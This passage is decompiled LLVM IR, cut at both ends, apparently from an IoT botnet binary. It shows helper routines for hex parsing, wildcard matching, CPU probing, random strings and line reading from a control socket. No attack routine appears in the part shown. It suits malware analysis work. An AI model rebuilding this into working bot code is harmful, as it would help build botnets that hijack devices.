  %v7_92e4 = icmp eq i32 %v1_92c8, 1
  br i1 %v7_92e4, label %dec_label_pc_92ec, label %dec_label_pc_931c

dec_label_pc_92ec:                                ; preds = %entry, %dec_label_pc_92ac
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_92d8, %dec_label_pc_92ac ]
  %v6_92f8 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_92f8, label %dec_label_pc_92fc, label %dec_label_pc_931c

dec_label_pc_92fc:                                ; preds = %dec_label_pc_92ec
  %v2_9308 = add i32 %storemerge25, %arg1
  %v1_930c = add i32 %v2_9308, -1
  %v1_9310 = inttoptr i32 %v1_930c to i8*
  %v2_9310 = load i8, i8* %v1_9310, align 1
  %v7_9314 = icmp eq i8 %v2_9310, 10
  br i1 %v7_9314, label %dec_label_pc_931c, label %dec_label_pc_92ac

dec_label_pc_931c:                                ; preds = %dec_label_pc_92fc, %dec_label_pc_92ec, %dec_label_pc_92ac
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_92fc ], [ 1, %dec_label_pc_92ec ], [ %v1_92c8, %dec_label_pc_92ac ]
  %v2_9320 = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_9320, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v2_9308, { 1, 0 }
  uselistorder i32 %v1_92c8, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_92ec, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_93a43 = load i8, i8* %arg1, align 1
  %v2_93a85 = icmp eq i8 %v2_93a43, 0
  br i1 %v2_93a85, label %dec_label_pc_93bc, label %dec_label_pc_93b0

dec_label_pc_9370:                                ; preds = %dec_label_pc_93b0
  %v3_9374 = mul i32 %stack_var_-20.07, 16
  %v2_937c = load i8, i8* %stack_var_-28.06, align 1
  %v3_937c = zext i8 %v2_937c to i32
  %v4_9388 = mul nuw nsw i32 %v3_937c, 4
  %v5_9388 = add i32 %v4_9388, ptrtoint (i32* @global_var_1ea6c.41 to i32)
  %v6_9388 = inttoptr i32 %v5_9388 to i32*
  %v7_9388 = load i32, i32* %v6_9388, align 4
  %v2_938c = or i32 %v7_9388, %v3_9374
  %v1_9398 = add i32 %v4_93a08, 1
  %v5_939c = inttoptr i32 %v1_9398 to i8*
  %v2_93a4 = load i8, i8* %v5_939c, align 1
  %v2_93a8 = icmp eq i8 %v2_93a4, 0
  br i1 %v2_93a8, label %dec_label_pc_93bc, label %dec_label_pc_93b0

dec_label_pc_93b0:                                ; preds = %entry, %dec_label_pc_9370
  %v4_93a08 = phi i32 [ %v1_9398, %dec_label_pc_9370 ], [ %tmp, %entry ]
  %stack_var_-20.07 = phi i32 [ %v2_938c, %dec_label_pc_9370 ], [ 0, %entry ]
  %stack_var_-28.06 = phi i8* [ %v5_939c, %dec_label_pc_9370 ], [ %arg1, %entry ]
  %v1_93b4 = icmp slt i32 %stack_var_-20.07, 0
  br i1 %v1_93b4, label %dec_label_pc_93bc, label %dec_label_pc_9370

dec_label_pc_93bc:                                ; preds = %dec_label_pc_9370, %dec_label_pc_93b0, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_938c, %dec_label_pc_9370 ], [ %stack_var_-20.07, %dec_label_pc_93b0 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_93bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93b0, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_93d8 = load i32, i32* @r4, align 4
  %v6_93d8 = load i32, i32* @fp, align 4
  store i32 37856, i32* %stack_var_-4, align 4
  %v2_93dc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_93dc, i32* @fp, align 4
  %v2_93f0 = load i8, i8* %arg1, align 1
  %v7_93fc = icmp eq i8 %v2_93f0, 42
  br i1 %v7_93fc, label %dec_label_pc_9430, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %entry
  %v7_9408 = icmp eq i8 %v2_93f0, 63
  br i1 %v7_9408, label %dec_label_pc_94a0, label %dec_label_pc_9410

dec_label_pc_9410:                                ; preds = %dec_label_pc_9404
  %v2_9414 = icmp eq i8 %v2_93f0, 0
  br i1 %v2_9414, label %dec_label_pc_9420, label %dec_label_pc_94f8

dec_label_pc_9420:                                ; preds = %dec_label_pc_9410
  %v2_9424 = load i8, i8* %tmp, align 1
  %v3_9424 = zext i8 %v2_9424 to i32
  br label %dec_label_pc_956c

dec_label_pc_9430:                                ; preds = %entry
  %v1_9434 = add i32 %tmp8, 1
  %v3_9440 = inttoptr i32 %v1_9434 to i8*
  %v4_9440 = call i32 @wildString(i8* %v3_9440, i32 %arg2)
  %v2_9448 = icmp eq i32 %v4_9440, 0
  br i1 %v2_9448, label %dec_label_pc_948c, label %dec_label_pc_9450

dec_label_pc_9450:                                ; preds = %dec_label_pc_9430
  %v2_9454 = load i8, i8* %tmp, align 1
  %v2_9458 = icmp eq i8 %v2_9454, 0
  br i1 %v2_9458, label %dec_label_pc_9494, label %dec_label_pc_9460

dec_label_pc_9460:                                ; preds = %dec_label_pc_9450
  %v1_9464 = add i32 %arg2, 1
  %v4_9470 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9464)
  %v2_9478 = icmp eq i32 %v4_9470, 0
  br i1 %v2_9478, label %dec_label_pc_948c, label %dec_label_pc_9494

dec_label_pc_948c:                                ; preds = %dec_label_pc_9460, %dec_label_pc_9430
  br label %dec_label_pc_9494

dec_label_pc_9494:                                ; preds = %dec_label_pc_9450, %dec_label_pc_9460, %dec_label_pc_948c
  %storemerge3 = phi i32 [ 0, %dec_label_pc_948c ], [ 1, %dec_label_pc_9460 ], [ 1, %dec_label_pc_9450 ]
  br label %dec_label_pc_956c

dec_label_pc_94a0:                                ; preds = %dec_label_pc_9404
  %v2_94a4 = load i8, i8* %tmp, align 1
  %v2_94a8 = icmp eq i8 %v2_94a4, 0
  br i1 %v2_94a8, label %dec_label_pc_94ec, label %dec_label_pc_94b0

dec_label_pc_94b0:                                ; preds = %dec_label_pc_94a0
  %v1_94b4 = add i32 %tmp8, 1
  %v1_94bc = add i32 %arg2, 1
  %v2_94c8 = inttoptr i32 %v1_94b4 to i8*
  %v3_94c8 = call i32 @wildString(i8* %v2_94c8, i32 %v1_94bc)
  %v2_94d0 = icmp ne i32 %v3_94c8, 0
  %. = zext i1 %v2_94d0 to i32
  br label %dec_label_pc_94ec

dec_label_pc_94ec:                                ; preds = %dec_label_pc_94b0, %dec_label_pc_94a0
  %storemerge2 = phi i32 [ 1, %dec_label_pc_94a0 ], [ %., %dec_label_pc_94b0 ]
  br label %dec_label_pc_956c

dec_label_pc_94f8:                                ; preds = %dec_label_pc_9410
  %v2_94fc = load i8, i8* %arg1, align 1
  %v3_94fc = zext i8 %v2_94fc to i32
  %v1_9504 = call i32 @__GI_toupper(i32 %v3_94fc)
  store i32 %v1_9504, i32* @r4, align 4
  %v2_9510 = load i8, i8* %tmp, align 1
  %v3_9510 = zext i8 %v2_9510 to i32
  %v1_9518 = call i32 @__GI_toupper(i32 %v3_9510)
  %v0_9520 = load i32, i32* @r4, align 4
  %v9_9520 = icmp eq i32 %v0_9520, %v1_9518
  br i1 %v9_9520, label %dec_label_pc_9528, label %dec_label_pc_9564

dec_label_pc_9528:                                ; preds = %dec_label_pc_94f8
  %v1_952c = add i32 %tmp8, 1
  %v1_9534 = add i32 %arg2, 1
  %v2_9540 = inttoptr i32 %v1_952c to i8*
  %v3_9540 = call i32 @wildString(i8* %v2_9540, i32 %v1_9534)
  %v2_9548 = icmp ne i32 %v3_9540, 0
  %.7 = zext i1 %v2_9548 to i32
  br label %dec_label_pc_9564

dec_label_pc_9564:                                ; preds = %dec_label_pc_9528, %dec_label_pc_94f8
  %storemerge = phi i32 [ 1, %dec_label_pc_94f8 ], [ %.7, %dec_label_pc_9528 ]
  br label %dec_label_pc_956c

dec_label_pc_956c:                                ; preds = %dec_label_pc_94ec, %dec_label_pc_9494, %dec_label_pc_9420, %dec_label_pc_9564
  %stack_var_-48.0 = phi i32 [ %storemerge3, %dec_label_pc_9494 ], [ %storemerge2, %dec_label_pc_94ec ], [ %v3_9424, %dec_label_pc_9420 ], [ %storemerge, %dec_label_pc_9564 ]
  store i32 %v3_93d8, i32* @r4, align 4
  store i32 %v6_93d8, i32* @fp, align 4
  ret i32 %stack_var_-48.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_956c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9494, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_95a0 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_95a0, i32* %arg2, align 4
  %v3_95b8 = icmp eq i32 %v1_95a0, -1
  %. = zext i1 %v3_95b8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_95f8 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_95f8 to i8*
  %v2_96303 = load i8, i8* %storemerge2, align 1
  %v2_96345 = icmp eq i8 %v2_96303, 0
  br i1 %v2_96345, label %dec_label_pc_963c, label %dec_label_pc_9600

dec_label_pc_9600:                                ; preds = %entry, %dec_label_pc_9600
  %storemerge7 = phi i8* [ %storemerge, %dec_label_pc_9600 ], [ %storemerge2, %entry ]
  %storemerge.in6 = phi i32 [ %v1_9624, %dec_label_pc_9600 ], [ %v0_95f8, %entry ]
  %v2_9604 = load i8, i8* %storemerge7, align 1
  %v3_9604 = zext i8 %v2_9604 to i32
  store i32 %v3_9604, i32* %r0.global-to-local, align 4
  %v1_960c = call i32 @__GI_toupper(i32 %v3_9604)
  store i32 %v1_960c, i32* %r0.global-to-local, align 4
  %v1_961c = trunc i32 %v1_960c to i8
  store i8 %v1_961c, i8* %storemerge7, align 1
  %v1_9624 = add i32 %storemerge.in6, 1
  %storemerge = inttoptr i32 %v1_9624 to i8*
  %v2_9630 = load i8, i8* %storemerge, align 1
  %v2_9634 = icmp eq i8 %v2_9630, 0
  br i1 %v2_9634, label %dec_label_pc_962c.dec_label_pc_963c_crit_edge, label %dec_label_pc_9600

dec_label_pc_962c.dec_label_pc_963c_crit_edge:    ; preds = %dec_label_pc_9600
  %v1_9644.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_963c

dec_label_pc_963c:                                ; preds = %dec_label_pc_962c.dec_label_pc_963c_crit_edge, %entry
  %v1_9644 = phi i32 [ %v1_9644.pre, %dec_label_pc_962c.dec_label_pc_963c_crit_edge ], [ %v0_95f8, %entry ]
  ret i32 %v1_9644

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_9624, { 1, 0 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v0_95f8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_9600, { 1, 0 }
}

define i32 @getBogos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4128 = alloca i32, align 4
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 -4108, i32* @r3, align 4
  %v2_9664 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_9664, i32* @r2, align 4
  %v3_9674 = call i32 @__GI_open(i32 ptrtoint ([14 x i8]* @global_var_1ee6c.43 to i32), i32 0)
  %v2_982c = ptrtoint i32* %stack_var_-4128 to i32
  %v1_9694 = bitcast i32* %stack_var_-4128 to i8*
  br label %dec_label_pc_9824

dec_label_pc_9684:                                ; preds = %dec_label_pc_9824
  %v2_9694 = call i32 @uppercase(i8* %v1_9694)
  %v4_96ac = call i32 @strstr(i32 %v2_982c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ee7c.45, i32 0, i32 0))
  %v9_96c4 = icmp eq i32 %v4_96ac, %v2_982c
  br i1 %v9_96c4, label %dec_label_pc_96cc, label %dec_label_pc_9808

dec_label_pc_96cc:                                ; preds = %dec_label_pc_9684
  %tmp21 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_96f0

dec_label_pc_96e4:                                ; preds = %dec_label_pc_9710, %dec_label_pc_9700, %dec_label_pc_96f0
  %v1_96e8 = add i32 %v4_96f0, 1
  %v5_96ec = inttoptr i32 %v1_96e8 to i8*
  br label %dec_label_pc_96f0

dec_label_pc_96f0:                                ; preds = %dec_label_pc_96cc, %dec_label_pc_96e4
  %storemerge2 = phi i8* [ %v5_96ec, %dec_label_pc_96e4 ], [ %tmp21, %dec_label_pc_96cc ]
  %v4_96f0 = ptrtoint i8* %storemerge2 to i32
  %v2_96f4 = load i8, i8* %storemerge2, align 1
  %v7_96f8 = icmp eq i8 %v2_96f4, 32
  br i1 %v7_96f8, label %dec_label_pc_96e4, label %dec_label_pc_9700

dec_label_pc_9700:                                ; preds = %dec_label_pc_96f0
  %v2_9704 = load i8, i8* %storemerge2, align 1
  %v7_9708 = icmp eq i8 %v2_9704, 9
  br i1 %v7_9708, label %dec_label_pc_96e4, label %dec_label_pc_9710

dec_label_pc_9710:                                ; preds = %dec_label_pc_9700
  %v2_9714 = load i8, i8* %storemerge2, align 1
  %v7_9718 = icmp eq i8 %v2_9714, 58
  br i1 %v7_9718, label %dec_label_pc_96e4, label %dec_label_pc_9748.preheader

dec_label_pc_9748.preheader:                      ; preds = %dec_label_pc_9710
  %v1_974c = add i32 %v4_96f0, -1
  br label %dec_label_pc_9748

dec_label_pc_9724:                                ; preds = %dec_label_pc_9770, %dec_label_pc_9748
  %v3_9734 = call i32 @strlen(i8* %storemerge2)
  %v2_973c = add i32 %v1_974c, %v3_9734
  %v3_9744 = inttoptr i32 %v2_973c to i8*
  store i8 0, i8* %v3_9744, align 1
  br label %dec_label_pc_9748

dec_label_pc_9748:                                ; preds = %dec_label_pc_9748.preheader, %dec_label_pc_9724
  %v3_9758 = call i32 @strlen(i8* %storemerge2)
  %v2_9760 = add i32 %v1_974c, %v3_9758
  %v1_9764 = inttoptr i32 %v2_9760 to i8*
  %v2_9764 = load i8, i8* %v1_9764, align 1
  %v7_9768 = icmp eq i8 %v2_9764, 13
  br i1 %v7_9768, label %dec_label_pc_9724, label %dec_label_pc_9770

dec_label_pc_9770:                                ; preds = %dec_label_pc_9748
  store i32 %v1_974c, i32* @r4, align 4
  %v3_9780 = call i32 @strlen(i8* %storemerge2)
  %v0_9788 = load i32, i32* @r4, align 4
  %v2_9788 = add i32 %v0_9788, %v3_9780
  %v1_978c = inttoptr i32 %v2_9788 to i8*
  %v2_978c = load i8, i8* %v1_978c, align 1
  %v7_9790 = icmp eq i8 %v2_978c, 10
  br i1 %v7_9790, label %dec_label_pc_9724, label %dec_label_pc_9798

dec_label_pc_9798:                                ; preds = %dec_label_pc_9770
  store i32 %v4_96f0, i32* @r0, align 4
  %v2_97a4 = call i32 @__GI_strchr(i32 %v4_96f0, i32 46)
  %v2_97ac = icmp eq i32 %v2_97a4, 0
  br i1 %v2_97ac, label %dec_label_pc_97d0, label %dec_label_pc_97b4

dec_label_pc_97b4:                                ; preds = %dec_label_pc_9798
  store i32 %v4_96f0, i32* @r0, align 4
  %v2_97c0 = call i32 @__GI_strchr(i32 %v4_96f0, i32 46)
  %v3_97cc = inttoptr i32 %v2_97c0 to i8*
  store i8 0, i8* %v3_97cc, align 1
  br label %dec_label_pc_97d0

dec_label_pc_97d0:                                ; preds = %dec_label_pc_9798, %dec_label_pc_97b4
  store i32 %v4_96f0, i32* @r1, align 4
  %v2_97ec = inttoptr i32 %arg1 to i8*
  %v3_97ec = call i32 @strcpy(i8* %v2_97ec, i32 %v4_96f0)
  %v1_97f4 = call i32 @__GI_close(i32 %v3_9674)
  br label %dec_label_pc_9860

dec_label_pc_9808:                                ; preds = %dec_label_pc_9684
  store i32 4096, i32* @r2, align 4
  %v3_9820 = call i32 @__GI_memset(i8* %v1_9694, i32 0)
  br label %dec_label_pc_9824

dec_label_pc_9824:                                ; preds = %entry, %dec_label_pc_9808
  %v4_983c = call i32 @fdgets(i32 %v2_982c, i32 4096, i32 %v3_9674, i32 %v2_982c)
  %v2_9844 = icmp eq i32 %v4_983c, 0
  br i1 %v2_9844, label %dec_label_pc_984c, label %dec_label_pc_9684

dec_label_pc_984c:                                ; preds = %dec_label_pc_9824
  %v1_9850 = call i32 @__GI_close(i32 %v3_9674)
  br label %dec_label_pc_9860

dec_label_pc_9860:                                ; preds = %dec_label_pc_97d0, %dec_label_pc_984c
  %storemerge4 = phi i32 [ 1, %dec_label_pc_984c ], [ 0, %dec_label_pc_97d0 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v1_974c, { 2, 1, 0 }
  uselistorder i32 %v4_96f0, { 3, 2, 1, 0, 5, 4, 6, 7 }
  uselistorder i8* %storemerge2, { 0, 2, 1, 3, 4, 6, 5 }
  uselistorder i32 %v2_982c, { 0, 3, 1, 2 }
  uselistorder i32 %v3_9674, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9860, { 1, 0 }
  uselistorder label %dec_label_pc_9824, { 1, 0 }
  uselistorder label %dec_label_pc_97d0, { 1, 0 }
  uselistorder label %dec_label_pc_9748, { 1, 0 }
  uselistorder label %dec_label_pc_96f0, { 1, 0 }
}

define i32 @getCores(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %v2_9890 = ptrtoint i32* %stack_var_-4120 to i32
  store i32 0, i32* @r3, align 4
  %v3_98a4 = call i32 @__GI_open(i32 ptrtoint ([14 x i8]* @global_var_1ee6c.43 to i32), i32 0)
  %v1_98c4 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_9920

dec_label_pc_98b4:                                ; preds = %dec_label_pc_9920
  %v2_98c4 = call i32 @uppercase(i8* %v1_98c4)
  %v4_98dc = call i32 @strstr(i32 %v2_9890, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ee7c.45, i32 0, i32 0))
  %v9_98f0 = icmp eq i32 %v4_98dc, %v2_9890
  br i1 %v9_98f0, label %dec_label_pc_98f8, label %dec_label_pc_9904

dec_label_pc_98f8:                                ; preds = %dec_label_pc_98b4
  %v1_98fc = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_9904

dec_label_pc_9904:                                ; preds = %dec_label_pc_98b4, %dec_label_pc_98f8
  %stack_var_-24.0 = phi i32 [ %v1_98fc, %dec_label_pc_98f8 ], [ %stack_var_-24.1, %dec_label_pc_98b4 ]
  store i32 4096, i32* @r2, align 4
  %v3_991c = call i32 @__GI_memset(i8* %v1_98c4, i32 0)
  br label %dec_label_pc_9920

dec_label_pc_9920:                                ; preds = %entry, %dec_label_pc_9904
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0, %dec_label_pc_9904 ]
  %v4_9938 = call i32 @fdgets(i32 %v2_9890, i32 4096, i32 %v3_98a4, i32 %v2_9890)
  %v2_9940 = icmp eq i32 %v4_9938, 0
  br i1 %v2_9940, label %dec_label_pc_9948, label %dec_label_pc_98b4

dec_label_pc_9948:                                ; preds = %dec_label_pc_9920
  %v1_994c = call i32 @__GI_close(i32 %v3_98a4)
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 0, 2, 1 }
  uselistorder i32 %v2_9890, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_9920, { 1, 0 }
  uselistorder label %dec_label_pc_9904, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_9970 = load i32, i32* @r4, align 4
  %v6_9970 = load i32, i32* @fp, align 4
  %v0_997c = load i32, i32* %r0.global-to-local, align 4
  %v5_9a1024 = icmp sgt i32 %arg2, 0
  br i1 %v5_9a1024, label %dec_label_pc_9998, label %dec_label_pc_9a14

dec_label_pc_9998:                                ; preds = %entry, %dec_label_pc_9998
  %storemerge725 = phi i32 [ %v1_99fc, %dec_label_pc_9998 ], [ 0, %entry ]
  %v2_99a4 = add i32 %storemerge725, %v0_997c
  store i32 %v2_99a4, i32* @r4, align 4
  %v0_99a8 = call i32 @rand_cmwc()
  store i32 %v0_99a8, i32* %r0.global-to-local, align 4
  %v3_99b8 = udiv i32 %v0_99a8, 26
  %tmp = mul nsw i32 %v3_99b8, -2
  %v2_99dc = add i32 %v0_99a8, %tmp
  %fold = add i32 %v2_99dc, 65
  %v1_99f4 = trunc i32 %fold to i8
  %v2_99f4 = load i32, i32* @r4, align 4
  %v3_99f4 = inttoptr i32 %v2_99f4 to i8*
  store i8 %v1_99f4, i8* %v3_99f4, align 1
  %v1_99fc = add nuw nsw i32 %storemerge725, 1
  %v5_9a10 = icmp slt i32 %v1_99fc, %arg2
  br i1 %v5_9a10, label %dec_label_pc_9998, label %dec_label_pc_9a04.dec_label_pc_9a14_crit_edge

dec_label_pc_9a04.dec_label_pc_9a14_crit_edge:    ; preds = %dec_label_pc_9998
  %v1_9a1c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a14

dec_label_pc_9a14:                                ; preds = %dec_label_pc_9a04.dec_label_pc_9a14_crit_edge, %entry
  %v1_9a1c = phi i32 [ %v1_9a1c.pre, %dec_label_pc_9a04.dec_label_pc_9a14_crit_edge ], [ %v0_997c, %entry ]
  store i32 %v3_9970, i32* @r4, align 4
  store i32 %v6_9970, i32* @fp, align 4
  ret i32 %v1_9a1c

; uselistorder directives
  uselistorder i32 %v1_99fc, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9998, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9a78.lr.ph:
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9a28 = load i32, i32* @fp, align 4
  store i32 %v3_9a28, i32* %stack_var_-16, align 4
  store i32 39472, i32* %stack_var_-4, align 4
  %v2_9a2c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9a2c, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_9a50 = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_9a64 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9a78

dec_label_pc_9a78:                                ; preds = %dec_label_pc_9a78.lr.ph, %dec_label_pc_9a78
  %storemerge426 = phi i32 [ 0, %dec_label_pc_9a78.lr.ph ], [ %v1_9a8c, %dec_label_pc_9a78 ]
  %v5_9a84 = mul nuw nsw i32 %storemerge426, 4
  %v6_9a84 = add i32 %v5_9a84, %v2_9a64
  %v7_9a84 = inttoptr i32 %v6_9a84 to i32*
  store i32 0, i32* %v7_9a84, align 4
  %v1_9a8c = add nuw nsw i32 %storemerge426, 1
  %tmp51 = icmp ult i32 %v1_9a8c, 32
  br i1 %tmp51, label %dec_label_pc_9a78, label %dec_label_pc_9aa0

dec_label_pc_9aa0:                                ; preds = %dec_label_pc_9a78
  %v13_9a28 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9aa4 = udiv i32 %arg1, 32
  %v3_9ab0 = mul nuw nsw i32 %v3_9aa4, 4
  %v2_9ab8 = add nsw i32 %v3_9ab0, -160
  %v2_9abc = add i32 %v2_9ab8, %v13_9a28
  %v1_9ac0 = inttoptr i32 %v2_9abc to i32*
  %v2_9ac0 = load i32, i32* %v1_9ac0, align 4
  %v1_9ac8 = urem i32 %arg1, 32
  %v6_9ad0 = shl i32 1, %v1_9ac8
  %v2_9ad4 = or i32 %v2_9ac0, %v6_9ad0
  store i32 %v2_9ad4, i32* %v1_9ac0, align 4
  %v1_9af4 = add i32 %arg1, 1
  %v2_9b00 = ptrtoint i32* %stack_var_-184 to i32
  store i32 0, i32* @r2, align 4
  %v5_9b14 = call i32 @__libc_select(i32 %v1_9af4, i32 %v2_9a64, i32 0, i32 %v2_9a64, i32 %v2_9b00)
  %v5_9b28 = icmp sgt i32 %v5_9b14, 0
  br i1 %v5_9b28, label %dec_label_pc_9cbc.preheader, label %dec_label_pc_9c28.preheader

dec_label_pc_9c28.preheader:                      ; preds = %dec_label_pc_9aa0
  %v7_9c3022 = icmp slt i32 %tmp32, 10
  br i1 %v7_9c3022, label %dec_label_pc_9b68.lr.ph, label %dec_label_pc_9cbc.preheader

dec_label_pc_9b68.lr.ph:                          ; preds = %dec_label_pc_9c28.preheader, %dec_label_pc_9c1c
  %stack_var_-44.023 = phi i32 [ %v1_9c20, %dec_label_pc_9c1c ], [ %tmp32, %dec_label_pc_9c28.preheader ]
  %v2_9b34 = load i32, i32* @global_var_2a530.50, align 4
  %v3_9b40 = call i32 @sockprintf(i32 %v2_9b34, i32 ptrtoint ([5 x i8]* @global_var_1ee88.52 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9b68

dec_label_pc_9b68:                                ; preds = %dec_label_pc_9b68.lr.ph, %dec_label_pc_9b68
  %storemerge514 = phi i32 [ 0, %dec_label_pc_9b68.lr.ph ], [ %v1_9b7c, %dec_label_pc_9b68 ]
  %v5_9b74 = mul nuw nsw i32 %storemerge514, 4
  %v6_9b74 = add i32 %v5_9b74, %v2_9a64
  %v7_9b74 = inttoptr i32 %v6_9b74 to i32*
  store i32 0, i32* %v7_9b74, align 4
  %v1_9b7c = add nuw nsw i32 %storemerge514, 1
  %tmp52 = icmp ult i32 %v1_9b7c, 32
  br i1 %tmp52, label %dec_label_pc_9b68, label %dec_label_pc_9b90

dec_label_pc_9b90:                                ; preds = %dec_label_pc_9b68
  %v2_9bb0 = load i32, i32* %v1_9ac0, align 4
  %v2_9bc4 = or i32 %v2_9bb0, %v6_9ad0
  store i32 %v2_9bc4, i32* %v1_9ac0, align 4
  store i32 0, i32* @r2, align 4
  %v5_9c04 = call i32 @__libc_select(i32 %v1_9af4, i32 %v2_9a64, i32 0, i32 %v2_9a64, i32 %v2_9b00)
  %v5_9c18 = icmp sgt i32 %v5_9c04, 0
  br i1 %v5_9c18, label %dec_label_pc_9cbc.preheader, label %dec_label_pc_9c1c

dec_label_pc_9c1c:                                ; preds = %dec_label_pc_9b90
  %v1_9c20 = add nsw i32 %stack_var_-44.023, 1
  %v7_9c30 = icmp slt i32 %v1_9c20, 10
  br i1 %v7_9c30, label %dec_label_pc_9b68.lr.ph, label %dec_label_pc_9cbc.preheader

dec_label_pc_9cbc.preheader:                      ; preds = %dec_label_pc_9c1c, %dec_label_pc_9b90, %dec_label_pc_9c28.preheader, %dec_label_pc_9aa0
  %v2_9c50 = ptrtoint i8* %stack_var_-185 to i32
  %not.v7_9cc456 = icmp sgt i32 %arg3, 1
  %v2_9cdc58 = icmp eq i1 %not.v7_9cc456, false
  br i1 %v2_9cdc58, label %dec_label_pc_9ce4, label %dec_label_pc_9c48

dec_label_pc_9c48:                                ; preds = %dec_label_pc_9cbc.preheader, %dec_label_pc_9cb0
  %v1_9cc061.in = phi i32 [ %v1_9cc061, %dec_label_pc_9cb0 ], [ %arg3, %dec_label_pc_9cbc.preheader ]
  %stack_var_-40.060 = phi i8* [ %v5_9ca0, %dec_label_pc_9cb0 ], [ %arg2, %dec_label_pc_9cbc.preheader ]
  %stack_var_-36.059 = phi i32 [ %v1_9cb4, %dec_label_pc_9cb0 ], [ 0, %dec_label_pc_9cbc.preheader ]
  %v1_9cc061 = add i32 %v1_9cc061.in, -1
  %v2_9c4c = load i32, i32* @global_var_2a530.50, align 4
  %v5_9c64 = call i32 @__libc_recv(i32 %v2_9c4c, i32 %v2_9c50, i32 1, i32 0, i32 %v1_9cc061)
  %v7_9c6c = icmp eq i32 %v5_9c64, 1
  br i1 %v7_9c6c, label %dec_label_pc_9c8c, label %dec_label_pc_9c74

dec_label_pc_9c74:                                ; preds = %dec_label_pc_9c48
  store i8 0, i8* %stack_var_-40.060, align 1
  br label %dec_label_pc_9cf8

dec_label_pc_9c8c:                                ; preds = %dec_label_pc_9c48
  %v3_9c8c = load i8, i8* %stack_var_-185, align 1
  %v4_9c90 = ptrtoint i8* %stack_var_-40.060 to i32
  store i8 %v3_9c8c, i8* %stack_var_-40.060, align 1
  %v1_9c9c = add i32 %v4_9c90, 1
  %v5_9ca0 = inttoptr i32 %v1_9c9c to i8*
  %v3_9ca4 = load i8, i8* %stack_var_-185, align 1
  %v7_9ca8 = icmp eq i8 %v3_9ca4, 10
